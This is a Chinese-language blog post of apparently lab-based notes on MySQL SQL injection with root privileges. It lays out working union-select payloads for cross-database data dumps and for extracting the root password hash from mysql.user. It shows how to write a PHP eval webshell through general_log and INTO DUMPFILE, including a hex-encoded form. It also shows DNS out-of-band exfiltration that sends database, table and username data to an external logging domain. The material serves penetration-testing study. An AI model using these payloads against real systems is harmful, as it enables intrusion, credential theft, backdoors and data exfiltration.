---
title: SQL注入&高权限判定&跨库查询&文件读写&DNS带外&SecurePriv开关绕过
published: 2026-04-23 15:00:00
description: Root与普通用户的本质差异：跨库查询+文件读写。secure_file_priv限制读写，NULL时完全禁用。高权限可写Webshell或DNS带外传数据，低权限只能报错/布尔盲注。
tags: [Web攻防,SQL注入]
category: 网络安全
draft: false
---

# 知识点

1. Web攻防-SQL注入-高权限用户差异
2. Web攻防-SQL注入-跨库&文件读写带外

案例说明：
在应用中，数据库用户不同，可操作的数据库和文件读写权限不一，所有在注入过程中可以有更多的利用思路，如直接写入后门，获取数据库下洽谈网站的数据等。

# 实验1

## root用户和普通用户

### 文件读写操作权限

#### 读文件

```
select LOAD_FILE('f:\\1.txt')
```

![image-20260423132828100](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260423132828100.png)

![image-20260423132823876](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260423132823876.png)

#### 写文件

```
select '内容' into OUTFILE 'f:\\x.txt'
或
select '内容' into DUMPFILE 'f:\\x.txt'
```

![image-20260423133009681](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260423133009681.png)

![image-20260423133016870](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260423133016870.png)

### 所有数据库名获取

![image-20260423131449497](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260423131449497.png)

# 实验2

## secure_file_priv开关

```
secure_file_priv是MySQL中的系统变量，用于限制文件的读取和写入
通过my.ini(windows版本)/my.cnf(Linux版本)中设置
```

my.ini中的secure_file_priv默认为空就代表是所有路径，如果限制在某个盘使用，那么就加上相应的盘符。

![image-20260423133544044](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260423133544044.png)

因为我设置了只能读写f盘的，所以其他盘就不展示了。

### 绕过条件

```
绕过条件：存在可执行的SQL地方（后台SQL命令执行，Phpmyadmin应用等）
从后台的sql命令执行功能点：注入获取得到这个网站的后台账号密码

从phpmyadmin命令执行功能点：注入获取到数据库的用户名和密码

phpmyadmin的用户密码存储在mysql数据库下的user表
(mysql低版本是user、password列名或mysql高版本是user、authentication_string为列名)
```

payload：

```
'union select user(),2,3#
```

查看是否为root。

```
'union select version(),2,3#
```

查询版本，一般高于5.4就是高版本。

```
'union select user,2,3 from mysql.user#
```

查询phpadmin的用户名。

```
'union select authentication_string,2,3 from mysql.user where User='root'#
```

查询root用户的密码。

拿到密文，之后放到网站进行解密：

```
*FD571203974BA9AFE270FE62151AE967ECA5E0AA
```

### getshell

```
全局命令：后台SQL命令执行、phpadmin应用等才可以执行，sql注入时不可用。

show variables like "secure%"

slow_query_log=1（启用慢查询日志(默认禁用)）

show variables like 'general_log';

set global general_log=on;

set global general_log_file='D:/phpstudy_pro/WWW/php/55/bypass.php';

select '<?php @eval($_POST[x]);?>'
```

# 跨库注入

查数据库名：

```
' union select SCHEMA_name,2,3 from information_schema.SCHEMATA#
```

查表名：

```
' union select table_name,2,3 from information_schema.tables where table_schema='aicms'#
```

查列名：

```
' union select column_name,2,3 from information_schema.columns where table_name='wolive_admin'#
```

查数据：

```
' union select username,2,3 from aicms.wolive_admin#
' union select password,2,3 from aicms.wolive_admin#
```

# 文件操作

## 文件读写

```
' union select LOAD_FILE('d:\\1.txt'),2,3#
```

```
' union select 'xxxx',2,3 into outfile 'd:\\3.txt'#
或
' union select 'xxxx',2,3 into dumpfile 'd:\\3.txt'#
```

实战中一般就是直接写`webshell`进网站目录下，那么关于网站路径获取方法：

1. 遗留文件（phpinfo）

   ![image-20260423142823386](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260423142823386.png)

2. 报错显示

   利用报错函数

   ```
   ' AND extractvalue(1, concat(0x7e, @@basedir))#
   ```

   提示：

   SELECT * FROM user1 WHERE username = '' AND extractvalue(1, concat(0x7e, @@basedir))#'XPATH syntax error: '~F:\StudySoftware\CODE\phpstudy\'

   之后写入php一句话后门

   ```
   ' union select '<?php @eval($_POST['pass']);?>',2,3 into dumpfile 'F:\\StudySoftware\\CODE\\phpstudy\\phpstudy_pro\\WWW\\phpdemo\\55\\php\\aaa.php'#
   ```

   因为有单引号问题，所以在识别php代码时候会拆为两段，这时需要用到工具把php代码部分转为十六进制：

   不需要带引号，不然会识别为字符串

   ```
   3C3F70687020406576616C28245F504F53545B2770617373275D293B3F3E
   ```

   ```
   ' union select 0x3C3F70687020406576616C28245F504F53545B2770617373275D293B3F3E,2,3 into dumpfile 'F:\\StudySoftware\\CODE\\phpstudy\\phpstudy_pro\\WWW\\phpdemo\\55\\php\\aaa.php'#
   ```

3. 读中间件配置

   apache->conf->vhosts

4. 爆破fuzz路径

# 带外注入

## 查数据名

```
' union select load_file(concat('\\\\',(select database()),'.acffgdifne.zaza.eu.org\\aa')),2,3#
```

## 查表名1

```
' union select load_file(concat("\\\\",(select table_name from information_schema.tables where table_schema='phpdemo' limit 0,1 ),".acffgdifne.zaza.eu.org\\xxx.txt")),2,3#
```

## 查表名2

```
' union select load_file(concat("\\\\",(select table_name from information_schema.tables where table_schema='phpdemo' limit 1,1 ),".acffgdifne.zaza.eu.org\\xxx.txt")),2,3#
```

## 查列名

```
一般第二个开始
' union select load_file(concat("\\\\",(select column_name from information_schema.columns where table_name='users' limit 1,1), '.acffgdifne.zaza.eu.org\\xxx.txt')),2,3#

' union select load_file(concat("\\\\",(select column_name from information_schema.columns where table_name='users' limit 2,1), '.acffgdifne.zaza.eu.org\\xxx.txt')),2,3#
```

## 查数据

```
' union select load_file(concat("\\\\",(select username from users limit 0,1),".acffgdifne.zaza.eu.org\\xxx.txt")),2,3#
```

